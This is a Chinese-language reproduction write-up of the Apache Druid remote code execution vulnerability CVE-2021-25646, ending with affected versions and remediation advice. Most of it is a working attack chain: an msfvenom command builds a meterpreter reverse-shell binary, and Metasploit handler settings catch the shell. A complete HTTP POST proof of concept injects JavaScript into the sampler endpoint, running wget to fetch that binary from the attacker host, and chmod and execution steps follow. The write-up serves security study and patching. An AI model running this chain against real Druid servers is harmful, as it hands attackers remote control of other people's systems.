## **一、﻿** **漏洞综述**

###  **1.1** **漏洞背景**

Apache Druid 是用Java编写的面向列的开源分布式数据存储系统，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。

近日Apache Druid官方发布了安全更新，修复远程代码执行漏洞(CVE-2021-25646)

###  **1.2** **漏洞描述**

Apache
Druid含有能够执行嵌入在各种类型请求中由用户提供的JavaScript代码功能。此功能适用于高度信任环境，且默认情况下已禁用。但是，在Druid
0.20.0及更早版本中，经过身份验证用户可以构造传入json串来控制某些参数发送恶意的请求，强制Druid为该请求运行用户提供的JavaScript代码。由于Apache
Druid默认情况下缺乏授权认证，攻击者可以利用此漏洞在目标机器上执行任意代码，最终可获取服务器的控制权限。

###  **1.3** **使用** **MSF** **生成反弹** **shell** **木马程序**

本次使用的攻击机地址为：192.168.159.131 靶机地址：192.168.159.139

1、使用MSF生成反弹shell的木马程序,命令为：msfvenom -p linux/x64/meterpreter/reverse_tcp
LHOST=192.168.159.131 LPORT=5555 -f elf > reverse.elf

备注：我这边使用的靶机是64位系统，所以选择的x64攻击负载,32位系统可以选择x86

![1612503010_601cd7e20464a0fb38978.png!small?1612503008418](https://image.3001.net/images/20210205/1612503010_601cd7e20464a0fb38978.png!small?1612503008418)

2、在攻击机上使用python开启web服务，下文将通过Apache Druid
远程代码执行漏洞执行wget命令，从刚搭建的web服务商下载msf生成的reverse.elf文件

![1612503018_601cd7eabe2df39dc43c5.png!small?1612503017233](https://image.3001.net/images/20210205/1612503018_601cd7eabe2df39dc43c5.png!small?1612503017233)

3、使用MSF开启监听模块，命令为：

use exploit/multi/handler

set payload linux/x64/meterpreter/reverse_tcp

set lhost 192.168.159.131

set lport 5555

run

![1612503494_601cd9c664d74b416590b.png!small?1612503492982](https://image.3001.net/images/20210205/1612503494_601cd9c664d74b416590b.png!small?1612503492982)

###  **1.4** **漏洞复现**

1、从<https://github.com/apache/druid/releases/tag/druid-0.19.0>下载Druid0.19版本，如下图所示

![1612503024_601cd7f0d34dd9f37d28f.png!small?1612503023428](https://image.3001.net/images/20210205/1612503024_601cd7f0d34dd9f37d28f.png!small?1612503023428)

2、使用docker搭建Druid漏洞环境，解压下载的文件，进入druid-druid-0.19.0/distribution/docker路径使用docker-compose up
–d搭建漏洞环境，完成之后访问<http://192.168.159.139:8888>

![1612503038_601cd7fec71c06f488a89.png!small?1612503037235](https://image.3001.net/images/20210205/1612503038_601cd7fec71c06f488a89.png!small?1612503037235)

3、将下面的poc复制到burpsuit的repeater模块，攻击载荷中最终执行的命令为：wget
<http://192.168.159.131:888/reverse.elf>，从搭建的web服务器上将反弹shell木马程序下载到靶机上

POST /druid/indexer/v1/sampler HTTP/1.1

Host: 192.168.159.139:8888

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101
Firefox/85.0

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Content-Type: application/json;charset=UTF-8

Content-Length: 931

{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":["https://druid.apache.org/data/example-manifests.tsv"]},"inputFormat":{"type":"tsv","findColumnsFromHeader":true}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"timestamp","missingValue":"2010-01-01T00:00:00Z"},"dimensionsSpec":{},"transformSpec":{"transforms":[],"filter":{"type":
"javascript",

"function": "function(value){return java.lang.Runtime.getRuntime().exec('wget
http://192.168.159.131:888/reverse.elf')}",

"dimension": "added",

"": {

"enabled": "true"

}

}

}

},"type":"index","tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":50,"timeoutMs":10000}}

![1612503601_601cda317b6b824c0f116.png!small?1612503600062](https://image.3001.net/images/20210205/1612503601_601cda317b6b824c0f116.png!small?1612503600062)

4、将下载到靶机上的reverse.elf恶意程序赋予可执行权限，命令为：chmod a+x reverse.elf

![1612503583_601cda1fced86fc6a93d8.png!small?1612503582247](https://image.3001.net/images/20210205/1612503583_601cda1fced86fc6a93d8.png!small?1612503582247)

5、执行reverse.elf程序，执行命令为: ./reverse.elf

![1612503570_601cda129be9426cef2c3.png!small?1612503569092](https://image.3001.net/images/20210205/1612503570_601cda129be9426cef2c3.png!small?1612503569092)

6、msf成功收到反弹的shell

![1612503563_601cda0b957822da0549d.png!small?1612503562141](https://image.3001.net/images/20210205/1612503563_601cda0b957822da0549d.png!small?1612503562141)

## 二、 **影响范围**

Apache Druid <= 0.20.0

##  **三、﻿** **严重等级**

高危

##  **四、﻿** **处置方法**

###  **4.1** **官方补丁**

Apache Druid
官方已在新版本中修复此漏洞，请升级至0.20.1及以上版本，下载链接：https://github.com/apache/druid/releases/tag/druid-0.20.1

###  **4.2** **临时缓解措施**

若暂时无法升级，可以通过以下方法临时缓解影响：

> 设置网络访问控制策略，只允许可信任的内网IP访问Druid。
>
> 引入druid-basic-> security扩展添加授权认证，具体配置方法见apache.org/docs/latest/development/extensions-> core/druid-basic-security.html

